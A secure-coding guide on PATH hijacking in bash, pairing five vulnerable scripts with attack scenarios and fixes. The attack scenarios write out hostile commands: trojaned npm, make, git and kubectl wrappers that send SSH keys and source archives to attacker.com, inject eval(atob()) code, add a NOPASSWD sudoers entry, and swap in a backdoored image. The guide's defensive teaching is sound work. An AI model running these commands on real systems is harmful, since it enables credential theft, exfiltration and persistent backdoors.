# PATH Vulnerability Examples

## Example 1: User-Controlled PATH

### Vulnerable Code

```bash
#!/bin/bash
# Script that installs custom tools

tools_dir="$1"
export PATH="$tools_dir:$PATH"

# Run install commands
npm install
make install
```

### Attack Scenario

```bash
# Attacker creates malicious npm
mkdir -p /tmp/evil
cat > /tmp/evil/npm << 'EOF'
#!/bin/bash
echo "Stealing credentials..."
curl -X POST https://attacker.com/steal -d "$(cat ~/.ssh/id_rsa)"
# Then run the real npm
/usr/bin/npm "$@"
EOF
chmod +x /tmp/evil/npm

# Run vulnerable script
./script.sh /tmp/evil
```

### Fixed Code

```bash
#!/bin/bash
# Secure version with validation

safe_install_tools() {
    local tools_dir="$1"
    
    # Validate directory
    if [[ ! -d "$tools_dir" ]]; then
        echo "Error: Directory not found: $tools_dir" >&2
        return 1
    fi
    
    # Must be absolute path
    if [[ "$tools_dir" != /* ]]; then
        echo "Error: Path must be absolute" >&2
        return 1
    fi
    
    # Check not world-writable
    if [[ -w "$tools_dir" ]]; then
        local perms
        perms=$(stat -c '%a' "$tools_dir")
        if [[ "$perms" =~ 7$ ]]; then
            echo "Error: Directory is world-writable" >&2
            return 1
        fi
    fi
    
    # Check ownership
    local owner
    owner=$(stat -c '%U' "$tools_dir")
    if [[ "$owner" != "$USER" ]] && [[ "$owner" != "root" ]]; then
        echo "Warning: Directory owned by $owner" >&2
    fi
    
    # Safe to use
    export PATH="$tools_dir:$PATH"
}

tools_dir="$1"
if [[ -n "$tools_dir" ]]; then
    safe_install_tools "$tools_dir" || exit 1
fi

# Use absolute paths for critical commands
/usr/bin/npm install
/usr/bin/make install
```

## Example 2: Relative PATH

### Vulnerable Code

```bash
#!/bin/bash
# Build script

export PATH="./build-tools:$PATH"
make build
```

### Attack Scenario

```bash
# Attacker places malicious make in current directory
cat > ./build-tools/make << 'EOF'
#!/bin/bash
echo "Running malicious build..."
# Exfiltrate code
tar czf /tmp/source.tar.gz .
curl -T /tmp/source.tar.gz https://attacker.com/upload
# Run real make to avoid suspicion
/usr/bin/make "$@"
EOF
chmod +x ./build-tools/make

# Run vulnerable script in attacker-controlled directory
cd /tmp/vulnerable-project
/path/to/build.sh
```

### Fixed Code

```bash
#!/bin/bash
# Secure build script

# Use absolute path
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BUILD_TOOLS="$SCRIPT_DIR/build-tools"

if [[ -d "$BUILD_TOOLS" ]]; then
    export PATH="$BUILD_TOOLS:$PATH"
fi

# Or even better: use full paths
"$BUILD_TOOLS/custom-compiler" src/ -o build/
/usr/bin/make build
```

## Example 3: HOME Directory in PATH

### Vulnerable Code

```bash
#!/bin/bash
# Development environment setup

export PATH="$HOME/bin:$PATH"
git pull
npm test
```

### Attack Scenario

```bash
# If attacker can write to user's home directory
# (e.g., through another vulnerability)
mkdir -p ~/bin
cat > ~/bin/git << 'EOF'
#!/bin/bash
# Inject malicious code into repository
echo "eval(atob('base64_payload'))" >> main.js
/usr/bin/git "$@"
EOF
chmod +x ~/bin/git

# Next time user runs the script, malicious git runs
```

### Fixed Code

```bash
#!/bin/bash
# Secure version using full paths

# If custom tools are needed, validate first
if [[ -d "$HOME/bin" ]]; then
    # Check it's not writable by others
    perms=$(stat -c '%a' "$HOME/bin")
    if [[ ! "$perms" =~ 7$ ]]; then
        export PATH="$HOME/bin:$PATH"
    else
        echo "Warning: ~/bin is world-writable, not adding to PATH" >&2
    fi
fi

# Use full paths for critical commands
/usr/bin/git pull
/usr/bin/npm test
```

## Example 4: Temporary Directory in PATH

### Vulnerable Code

```bash
#!/bin/bash
# Installer script

mkdir -p /tmp/installer-tools
cp custom-tool /tmp/installer-tools/
export PATH="/tmp/installer-tools:$PATH"

custom-tool --install
```

### Attack Scenario

```bash
# Race condition: attacker creates malicious tool first
cat > /tmp/installer-tools/custom-tool << 'EOF'
#!/bin/bash
echo "Installing backdoor..."
echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
EOF
chmod +x /tmp/installer-tools/custom-tool

# Or symlink attack
ln -s /tmp/attacker-tools /tmp/installer-tools
```

### Fixed Code

```bash
#!/bin/bash
# Secure installer

# Create tool directory in safer location
TOOL_DIR=$(mktemp -d -p "$HOME")
trap "rm -rf '$TOOL_DIR'" EXIT

cp custom-tool "$TOOL_DIR/"
chmod 700 "$TOOL_DIR"

# Use full path instead of modifying PATH
"$TOOL_DIR/custom-tool" --install
```

## Example 5: Chained Vulnerabilities

### Vulnerable Code

```bash
#!/bin/bash
# CI/CD pipeline script

# Load custom environment
source "$1"

# Run tests and deployment
pytest
kubectl apply -f deploy.yaml
```

### Attack Scenario

```bash
# Attacker provides malicious environment file
cat > evil-env.sh << 'EOF'
export PATH="/tmp/malicious:$PATH"
EOF

# Create malicious kubectl
mkdir -p /tmp/malicious
cat > /tmp/malicious/kubectl << 'EOF'
#!/bin/bash
echo "Deploying backdoor..."
# Modify deployment to include backdoor
sed -i 's/image: app:latest/image: app-backdoored:latest/' "$4"
/usr/bin/kubectl "$@"
EOF
chmod +x /tmp/malicious/kubectl

# Run vulnerable script
./pipeline.sh evil-env.sh
```

### Fixed Code

```bash
#!/bin/bash
# Secure CI/CD pipeline

# Don't source arbitrary files
# Instead, use a configuration parser
CONFIG_FILE="$1"

if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "Error: Config file not found" >&2
    exit 1
fi

# Parse configuration safely (example using jq for JSON config)
PYTEST_OPTS=$(jq -r '.pytest_opts // ""' "$CONFIG_FILE")
KUBECTL_CONTEXT=$(jq -r '.kubectl_context // "default"' "$CONFIG_FILE")

# Use full paths and validated options
/usr/bin/pytest $PYTEST_OPTS
/usr/bin/kubectl --context="$KUBECTL_CONTEXT" apply -f deploy.yaml
```

## General Patterns to Avoid

### Anti-Pattern: Dynamic PATH from Arguments

```bash
# NEVER DO THIS
export PATH="$1:$PATH"
command_to_run
```

### Anti-Pattern: PATH from Environment

```bash
# DANGEROUS
export PATH="$CUSTOM_PATH:$PATH"
make install
```

### Anti-Pattern: Relative Paths

```bash
# DANGEROUS
export PATH="./bin:../tools:$PATH"
```

### Anti-Pattern: World-Writable Locations

```bash
# DANGEROUS
export PATH="/tmp:/var/tmp:$PATH"
```

## Safe Patterns

### Safe Pattern: Full Paths

```bash
# SAFE
/usr/local/bin/custom-tool args
```

### Safe Pattern: Validated Absolute Paths

```bash
# SAFE (with validation)
if [[ -d "$TOOLS_DIR" ]] && [[ "$TOOLS_DIR" == /* ]]; then
    export PATH="$TOOLS_DIR:$PATH"
fi
```

### Safe Pattern: Isolated Subshell

```bash
# SAFE (impact is limited)
(
    export PATH="/usr/local/custom:$PATH"
    custom-command
)
# PATH change doesn't affect parent shell
```

### Safe Pattern: Append Instead of Prepend

```bash
# SAFER (system commands take precedence)
export PATH="$PATH:/usr/local/custom"
```
